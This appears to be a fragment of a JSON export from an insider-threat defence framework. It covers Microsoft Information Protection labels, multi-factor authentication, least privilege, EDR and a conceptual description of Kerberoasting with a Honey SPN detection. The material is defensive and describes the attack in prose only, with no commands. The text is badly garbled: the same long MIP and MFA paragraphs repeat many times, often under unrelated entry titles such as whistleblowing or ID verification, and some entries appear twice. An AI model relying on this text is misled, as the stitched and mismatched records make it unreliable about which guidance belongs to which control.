When applied to documents, emails, and other content, MIP labels embed metadata that enforces encryption, access control policies, and usage restrictions \u2014 all of which persist even if the content is shared or moved outside the organization\u2019s environment. This proactive protection mechanism helps to ensure that data loss, misuse, or regulatory breaches are minimized, regardless of where or how the data is accessed.<\/p><p>&nbsp;<\/p><p><strong>Persistent Protection through Azure Rights Management (Azure RMS)<\/strong><br>One of the key features of MIP labels is their ability to enforce encryption and access control via Azure Rights Management (Azure RMS). When a document or email is assigned a sensitivity label such as Highly Confidential, it triggers policies that encrypt the file, limiting who can open it and what actions can be performed. For example, a Highly Confidential document might be encrypted so that only authorized users in specific security groups can access it. Additionally, these policies may prevent recipients from forwarding, printing, copying, or even accessing the document offline, ensuring that sensitive data cannot be shared beyond authorized channels.<\/p><p>&nbsp;<\/p><p><strong>Automatic and Recommended Labeling<\/strong><br>MIP labels also support automatic and recommended labeling. Labels can be automatically applied based on content that is identified as sensitive (such as credit card numbers, Social Security numbers, or intellectual property). This reduces reliance on users to manually select the correct label, ensuring that content is always classified according to its sensitivity level. For example, a file containing financial data or personally identifiable information (PII) may automatically receive a Confidential label, which immediately triggers encryption and access controls. By applying labels automatically, organizations can minimize the risk of human error in classifying sensitive content and ensure that protective measures are consistently applied.<\/p><p>&nbsp;<\/p><p><strong>Enforcing Access Governance and User Restrictions<\/strong><br>MIP labels are directly integrated with Azure Active Directory (Azure AD) and Microsoft 365 security groups, allowing organizations to enforce access governance. Each label can define the users or groups who are permitted to access certain types of content. For example, a document labeled Confidential may be restricted to a specific department or team, preventing unauthorized users from viewing or editing it. Access to content labeled with higher sensitivity, such as Highly Confidential, can be further restricted to executives or security professionals, ensuring that only authorized individuals can access critical business data. These policies persist even when the content is shared outside the organization or accessed on non-corporate devices.<\/p><p>&nbsp;<\/p><p><strong>Blocking Unauthorized Sharing and Transfers<\/strong><br>Through integration with Microsoft Defender for Office 365 and Data Loss Prevention (DLP) policies, MIP labels can enforce automatic blocking of unauthorized sharing or transfer of sensitive content. For example, when a document is labeled as Internal Use Only, any attempt to share it externally via email, cloud storage, or external USB devices can be blocked automatically by DLP policies. Labels can also be configured to restrict sharing links to specific people or groups and can enforce expiration on shared links. This ensures that sensitive data remains within the organization and cannot be accessed by unauthorized individuals or systems.<\/p><p>&nbsp;<\/p><p><strong>Policy Enforcement in Microsoft Teams and SharePoint<\/strong><br>MIP labels are integrated across key collaboration tools like Microsoft Teams and SharePoint, providing seamless protection in the cloud. In these environments, sensitivity labels govern sharing permissions, access rights, and file handling. For instance, if a file is labeled as Confidential, it might be restricted from being shared externally via Teams or SharePoint. These platforms can also prevent file download and sharing for users in unmanaged or non-compliant environments, ensuring that sensitive data cannot be accessed outside the organization's controlled infrastructure. MIP labels also enable policies that enforce restrictions on guest access, preventing external parties from viewing or editing sensitive content unless explicitly permitted.<\/p><p>&nbsp;<\/p><p><strong>Blocking Label Downgrades and Enforcing Label Change Justification<\/strong><br>To prevent unauthorized downgrading of content labels, MIP provides mechanisms to block label downgrades without proper justification. For example, a user may not be allowed to change a document\u2019s label from Confidential to Public without providing an explicit justification. Such actions are logged and may trigger alerts for review by security teams. This ensures that users cannot bypass sensitive information protection policies by reclassifying content to a lower sensitivity level. Moreover, any label changes are auditable, helping organizations track and monitor potential attempts to circumvent security protocols.<\/p><p>&nbsp;<\/p><p><strong>Preventing Exfiltration in Cloud and Endpoint Contexts<\/strong><br>MIP labels integrate with Microsoft Defender for Endpoint and Defender for Cloud Apps, providing protection against exfiltration of sensitive data through cloud and endpoint channels. By applying labels to sensitive documents, organizations can enforce controls that restrict their movement across corporate boundaries. For example, when a file labeled Confidential is accessed from an unmanaged device or through a risky application, it may be blocked from being downloaded or printed, preventing potential exfiltration. Additionally, organizations can configure conditional access policies to prevent data access based on the device\u2019s compliance or security status, ensuring that sensitive information is protected even when users access it from external sources.<\/p>","contributors":[{"name":"The ITM Team"}],"platforms":[[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}]],"references":[{"text":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels","url":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms"}]},{"id":"PV022","title":"Internal Whistleblowing","description":"<p>Provide a process for all staff members to report concerning and\/or suspicious behaviour to the organization's security team for review.

Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[]},{"id":"PV038","title":"Insider Threat Awareness Training","description":"<p>Training should equip employees to recognize manipulation tactics, such as social engineering and extortion, that are used to coerce actions and behaviors harmful to the individual and\/or the organization.

When applied to documents, emails, and other content, MIP labels embed metadata that enforces encryption, access control policies, and usage restrictions \u2014 all of which persist even if the content is shared or moved outside the organization\u2019s environment. This proactive protection mechanism helps to ensure that data loss, misuse, or regulatory breaches are minimized, regardless of where or how the data is accessed.<\/p><p>&nbsp;<\/p><p><strong>Persistent Protection through Azure Rights Management (Azure RMS)<\/strong><br>One of the key features of MIP labels is their ability to enforce encryption and access control via Azure Rights Management (Azure RMS). When a document or email is assigned a sensitivity label such as Highly Confidential, it triggers policies that encrypt the file, limiting who can open it and what actions can be performed. For example, a Highly Confidential document might be encrypted so that only authorized users in specific security groups can access it. Additionally, these policies may prevent recipients from forwarding, printing, copying, or even accessing the document offline, ensuring that sensitive data cannot be shared beyond authorized channels.<\/p><p>&nbsp;<\/p><p><strong>Automatic and Recommended Labeling<\/strong><br>MIP labels also support automatic and recommended labeling. Labels can be automatically applied based on content that is identified as sensitive (such as credit card numbers, Social Security numbers, or intellectual property). This reduces reliance on users to manually select the correct label, ensuring that content is always classified according to its sensitivity level. For example, a file containing financial data or personally identifiable information (PII) may automatically receive a Confidential label, which immediately triggers encryption and access controls. By applying labels automatically, organizations can minimize the risk of human error in classifying sensitive content and ensure that protective measures are consistently applied.<\/p><p>&nbsp;<\/p><p><strong>Enforcing Access Governance and User Restrictions<\/strong><br>MIP labels are directly integrated with Azure Active Directory (Azure AD) and Microsoft 365 security groups, allowing organizations to enforce access governance. Each label can define the users or groups who are permitted to access certain types of content. For example, a document labeled Confidential may be restricted to a specific department or team, preventing unauthorized users from viewing or editing it. Access to content labeled with higher sensitivity, such as Highly Confidential, can be further restricted to executives or security professionals, ensuring that only authorized individuals can access critical business data. These policies persist even when the content is shared outside the organization or accessed on non-corporate devices.<\/p><p>&nbsp;<\/p><p><strong>Blocking Unauthorized Sharing and Transfers<\/strong><br>Through integration with Microsoft Defender for Office 365 and Data Loss Prevention (DLP) policies, MIP labels can enforce automatic blocking of unauthorized sharing or transfer of sensitive content. For example, when a document is labeled as Internal Use Only, any attempt to share it externally via email, cloud storage, or external USB devices can be blocked automatically by DLP policies. Labels can also be configured to restrict sharing links to specific people or groups and can enforce expiration on shared links. This ensures that sensitive data remains within the organization and cannot be accessed by unauthorized individuals or systems.<\/p><p>&nbsp;<\/p><p><strong>Policy Enforcement in Microsoft Teams and SharePoint<\/strong><br>MIP labels are integrated across key collaboration tools like Microsoft Teams and SharePoint, providing seamless protection in the cloud. In these environments, sensitivity labels govern sharing permissions, access rights, and file handling. For instance, if a file is labeled as Confidential, it might be restricted from being shared externally via Teams or SharePoint. These platforms can also prevent file download and sharing for users in unmanaged or non-compliant environments, ensuring that sensitive data cannot be accessed outside the organization's controlled infrastructure. MIP labels also enable policies that enforce restrictions on guest access, preventing external parties from viewing or editing sensitive content unless explicitly permitted.<\/p><p>&nbsp;<\/p><p><strong>Blocking Label Downgrades and Enforcing Label Change Justification<\/strong><br>To prevent unauthorized downgrading of content labels, MIP provides mechanisms to block label downgrades without proper justification. For example, a user may not be allowed to change a document\u2019s label from Confidential to Public without providing an explicit justification. Such actions are logged and may trigger alerts for review by security teams. This ensures that users cannot bypass sensitive information protection policies by reclassifying content to a lower sensitivity level. Moreover, any label changes are auditable, helping organizations track and monitor potential attempts to circumvent security protocols.<\/p><p>&nbsp;<\/p><p><strong>Preventing Exfiltration in Cloud and Endpoint Contexts<\/strong><br>MIP labels integrate with Microsoft Defender for Endpoint and Defender for Cloud Apps, providing protection against exfiltration of sensitive data through cloud and endpoint channels. By applying labels to sensitive documents, organizations can enforce controls that restrict their movement across corporate boundaries. For example, when a file labeled Confidential is accessed from an unmanaged device or through a risky application, it may be blocked from being downloaded or printed, preventing potential exfiltration. Additionally, organizations can configure conditional access policies to prevent data access based on the device\u2019s compliance or security status, ensuring that sensitive information is protected even when users access it from external sources.<\/p>","contributors":[{"name":"The ITM Team"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[{"text":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels","url":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms"}]},{"id":"PV038","title":"Insider Threat Awareness Training","description":"<p>Training should equip employees to recognize manipulation tactics, such as social engineering and extortion, that are used to coerce actions and behaviors harmful to the individual and\/or the organization.

Labels can be applied manually by users or automatically via content inspection rules, data classification policies, or machine learning models. Once applied, labels can enforce a range of protections, including Azure Information Protection (AIP)-based encryption, visual markings (e.g., headers, footers, watermarks), and access restrictions.<\/p><p>&nbsp;<\/p><p>Because MIP labels are integrated with Microsoft 365 applications and services, they serve as a powerful mechanism for monitoring and auditing sensitive data handling.

When applied to documents, emails, and other content, MIP labels embed metadata that enforces encryption, access control policies, and usage restrictions \u2014 all of which persist even if the content is shared or moved outside the organization\u2019s environment. This proactive protection mechanism helps to ensure that data loss, misuse, or regulatory breaches are minimized, regardless of where or how the data is accessed.<\/p><p>&nbsp;<\/p><p><strong>Persistent Protection through Azure Rights Management (Azure RMS)<\/strong><br>One of the key features of MIP labels is their ability to enforce encryption and access control via Azure Rights Management (Azure RMS). When a document or email is assigned a sensitivity label such as Highly Confidential, it triggers policies that encrypt the file, limiting who can open it and what actions can be performed. For example, a Highly Confidential document might be encrypted so that only authorized users in specific security groups can access it. Additionally, these policies may prevent recipients from forwarding, printing, copying, or even accessing the document offline, ensuring that sensitive data cannot be shared beyond authorized channels.<\/p><p>&nbsp;<\/p><p><strong>Automatic and Recommended Labeling<\/strong><br>MIP labels also support automatic and recommended labeling. Labels can be automatically applied based on content that is identified as sensitive (such as credit card numbers, Social Security numbers, or intellectual property). This reduces reliance on users to manually select the correct label, ensuring that content is always classified according to its sensitivity level. For example, a file containing financial data or personally identifiable information (PII) may automatically receive a Confidential label, which immediately triggers encryption and access controls. By applying labels automatically, organizations can minimize the risk of human error in classifying sensitive content and ensure that protective measures are consistently applied.<\/p><p>&nbsp;<\/p><p><strong>Enforcing Access Governance and User Restrictions<\/strong><br>MIP labels are directly integrated with Azure Active Directory (Azure AD) and Microsoft 365 security groups, allowing organizations to enforce access governance. Each label can define the users or groups who are permitted to access certain types of content. For example, a document labeled Confidential may be restricted to a specific department or team, preventing unauthorized users from viewing or editing it. Access to content labeled with higher sensitivity, such as Highly Confidential, can be further restricted to executives or security professionals, ensuring that only authorized individuals can access critical business data. These policies persist even when the content is shared outside the organization or accessed on non-corporate devices.<\/p><p>&nbsp;<\/p><p><strong>Blocking Unauthorized Sharing and Transfers<\/strong><br>Through integration with Microsoft Defender for Office 365 and Data Loss Prevention (DLP) policies, MIP labels can enforce automatic blocking of unauthorized sharing or transfer of sensitive content. For example, when a document is labeled as Internal Use Only, any attempt to share it externally via email, cloud storage, or external USB devices can be blocked automatically by DLP policies. Labels can also be configured to restrict sharing links to specific people or groups and can enforce expiration on shared links. This ensures that sensitive data remains within the organization and cannot be accessed by unauthorized individuals or systems.<\/p><p>&nbsp;<\/p><p><strong>Policy Enforcement in Microsoft Teams and SharePoint<\/strong><br>MIP labels are integrated across key collaboration tools like Microsoft Teams and SharePoint, providing seamless protection in the cloud. In these environments, sensitivity labels govern sharing permissions, access rights, and file handling. For instance, if a file is labeled as Confidential, it might be restricted from being shared externally via Teams or SharePoint. These platforms can also prevent file download and sharing for users in unmanaged or non-compliant environments, ensuring that sensitive data cannot be accessed outside the organization's controlled infrastructure. MIP labels also enable policies that enforce restrictions on guest access, preventing external parties from viewing or editing sensitive content unless explicitly permitted.<\/p><p>&nbsp;<\/p><p><strong>Blocking Label Downgrades and Enforcing Label Change Justification<\/strong><br>To prevent unauthorized downgrading of content labels, MIP provides mechanisms to block label downgrades without proper justification. For example, a user may not be allowed to change a document\u2019s label from Confidential to Public without providing an explicit justification. Such actions are logged and may trigger alerts for review by security teams. This ensures that users cannot bypass sensitive information protection policies by reclassifying content to a lower sensitivity level. Moreover, any label changes are auditable, helping organizations track and monitor potential attempts to circumvent security protocols.<\/p><p>&nbsp;<\/p><p><strong>Preventing Exfiltration in Cloud and Endpoint Contexts<\/strong><br>MIP labels integrate with Microsoft Defender for Endpoint and Defender for Cloud Apps, providing protection against exfiltration of sensitive data through cloud and endpoint channels. By applying labels to sensitive documents, organizations can enforce controls that restrict their movement across corporate boundaries. For example, when a file labeled Confidential is accessed from an unmanaged device or through a risky application, it may be blocked from being downloaded or printed, preventing potential exfiltration. Additionally, organizations can configure conditional access policies to prevent data access based on the device\u2019s compliance or security status, ensuring that sensitive information is protected even when users access it from external sources.<\/p>","contributors":[{"name":"The ITM Team"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[{"text":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels","url":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms"}]},{"id":"PV038","title":"Insider Threat Awareness Training","description":"<p>Training should equip employees to recognize manipulation tactics, such as social engineering and extortion, that are used to coerce actions and behaviors harmful to the individual and\/or the organization.

This multi-layered approach significantly reduces the risk of unauthorized access, especially in cases where an attacker has obtained or guessed a user\u2019s credentials. MFA is particularly valuable in environments where attackers may have gained access to user credentials via phishing, data breaches, or social engineering.<\/p><p>&nbsp;<\/p><p>For organizations, enabling MFA across all critical systems is essential. This includes systems such as Active Directory, VPNs, cloud platforms (e.g., AWS, Azure, Google Cloud), internal applications, and any resources that store sensitive data. MFA ensures that access control is not solely dependent on passwords, which are vulnerable to compromise. Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}]],"references":[]},{"id":"PV002","title":"Restrict Access to Administrative Privileges","description":"<p>The Principle of Least Privilege should be enforced, and period reviews of permissions conducted to ensure that accounts have the minimum level of access required to complete duties as per their role.<\/p>","contributors":[{"name":"The ITM Team"}],"platforms":[],"references":[]}],"detections":[{"id":"DT046","title":"Agent Capable of Endpoint Detection and Response","description":"<p>An agent capable of Endpoint Detection and Response (EDR) is a software agent installed on organization endpoints (such as laptops and servers) that (at a minimum) records the Operating System, application, and network activity on an endpoint.<\/p><p>&nbsp;<\/p><p>Typically EDR operates in an agent\/server model, where agents automatically send logs to a server, where the server correlates those logs based on a rule set.

This multi-layered approach significantly reduces the risk of unauthorized access, especially in cases where an attacker has obtained or guessed a user\u2019s credentials. MFA is particularly valuable in environments where attackers may have gained access to user credentials via phishing, data breaches, or social engineering.<\/p><p>&nbsp;<\/p><p>For organizations, enabling MFA across all critical systems is essential. This includes systems such as Active Directory, VPNs, cloud platforms (e.g., AWS, Azure, Google Cloud), internal applications, and any resources that store sensitive data. MFA ensures that access control is not solely dependent on passwords, which are vulnerable to compromise. Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[]},{"id":"PV022","title":"Internal Whistleblowing","description":"<p>Provide a process for all staff members to report concerning and\/or suspicious behaviour to the organization's security team for review.

This multi-layered approach significantly reduces the risk of unauthorized access, especially in cases where an attacker has obtained or guessed a user\u2019s credentials. MFA is particularly valuable in environments where attackers may have gained access to user credentials via phishing, data breaches, or social engineering.<\/p><p>&nbsp;<\/p><p>For organizations, enabling MFA across all critical systems is essential. This includes systems such as Active Directory, VPNs, cloud platforms (e.g., AWS, Azure, Google Cloud), internal applications, and any resources that store sensitive data. MFA ensures that access control is not solely dependent on passwords, which are vulnerable to compromise. Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}]],"references":[]},{"id":"PV053","title":"Government-Issued ID Verification","description":"<p>An individual may be required to present and verify valid government-issued identification prior to their association with the organization.

From the perspective of a subject\u2014who may be a low-privileged user with legitimate access to the network\u2014the attack takes advantage of weaknesses in the Kerberos authentication protocol used by Active Directory (AD).<\/p><p>&nbsp;<\/p><h3>Kerberos Authentication Process<\/h3><p>In a Kerberos-based network (like those using Active Directory), clients\u2014users, computers, or services\u2014authenticate to services using service tickets. When a client wants to access a service (e.g., a file server or email service), it requests a service ticket from the Ticket Granting Service (TGS). This request is made using the Service Principal Name (SPN) of the target service.<\/p><p>The TGS then issues a service ticket containing the hashed credentials (password) of the service account associated with that SPN. These credentials are encrypted in the service ticket, and the client can present the ticket to the service to authenticate.<\/p><p>&nbsp;<\/p><h3>Subject Requesting Service Tickets<\/h3><p>A subject, typically a domain user with limited privileges, can exploit this process by requesting service tickets for service accounts running critical or high-privilege services, such as domain controllers or admin-level service accounts. These accounts are often associated with SPNs in Active Directory.<\/p><p>The subject can identify these SPNs\u2014often for high-value targets like SQL Server, Exchange, or other administrative services\u2014by querying the domain or using enumeration tools. Once these SPNs are identified, the subject can request service tickets for these service accounts from the TGS.<\/p><p>&nbsp;<\/p><h3>Cracking the Service Tickets<\/h3><p>The key aspect of the Kerberoasting attack is that the service tickets contain hashed credentials of the service account. If these service accounts use weak, easily guessable passwords, the subject can extract the service tickets and attempt to crack the hashes offline using tools like Hashcat or John the Ripper.<\/p><p>Since these passwords are typically not subject to regular user password policies (i.e., they may not be as complex), weak or easily cracked passwords are a prime target for the subject.<\/p><p>&nbsp;<\/p><h3>Privilege Escalation and Unauthorized Access<\/h3><p>Once the subject successfully cracks the password of a service account, they can use the credentials to gain elevated privileges.

This could lead to further insider events, such as data exfiltration, malware deployment, or even persistent backdoors for ongoing unauthorized access.<\/li><\/ul><p>&nbsp;<\/p><h3>Reconnaissance and Exploitation<\/h3><p>The subject can perform additional reconnaissance within the network to identify other high-privilege accounts and services associated with service accounts. They can continue requesting service tickets for additional SPNs and cracking any other weak passwords they find, gradually escalating their access to more critical systems.<\/p><p>With broad access, the subject may also attempt to manipulate access controls, elevate privileges further, or carry out malicious actions undetected.

In the Kerberos authentication process, a client\u2014which could be any user, computer, or service\u2014requests access to a particular service, such as email, file shares, or database servers. To authenticate and gain access to that service, the client must obtain a service ticket from the Ticket Granting Service (TGS).<\/p><p>&nbsp;<\/p><p>The client first requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), which is part of the Kerberos infrastructure. Once the client has a TGT, it can use it to request a service ticket from the TGS for a specific service identified by its SPN. The service ticket contains the hashed credentials of the service account associated with that SPN, allowing the client to authenticate to the service securely.<\/p><p>In a Kerberoasting attack, an adversary\u2014who is often a domain-joined user\u2014requests service tickets for service accounts with weak or guessable passwords. These tickets can then be captured and cracked offline to reveal the service account\u2019s password. This process is typically initiated by an attacker who targets SPNs associated with high-privilege accounts.<\/p><p>&nbsp;<\/p><p><strong>A Honey SPN<\/strong> is a decoy SPN created with no legitimate use, designed specifically to attract malicious actors. By monitoring for TGS requests for these fake SPNs, defenders can detect when attackers are probing for service tickets associated with non-existent or intentionally misleading accounts.

